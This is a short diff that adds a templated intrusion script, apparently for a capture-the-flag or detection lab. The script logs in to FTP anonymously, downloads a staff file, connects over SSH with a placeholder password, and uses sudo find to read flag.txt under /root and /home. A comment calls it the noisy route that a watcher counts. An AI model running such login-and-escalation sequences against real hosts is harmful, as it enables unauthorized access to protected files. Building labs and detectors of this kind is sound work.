@@ -1,0 +1,12 @@
+## the LOUD way here: the obvious sudo route, the very thing this watcher counts
+ftp {{NET}}.20
+anonymous
+guest
+cd pub
+get new-staff.txt
+bye
+ssh -o StrictHostKeyChecking=accept-new {{USER}}@{{NET}}.20
+{{PW1}}
+sudo find /root -name flag.txt -exec cat {} \;
+sudo find /home -name flag.txt
+exit
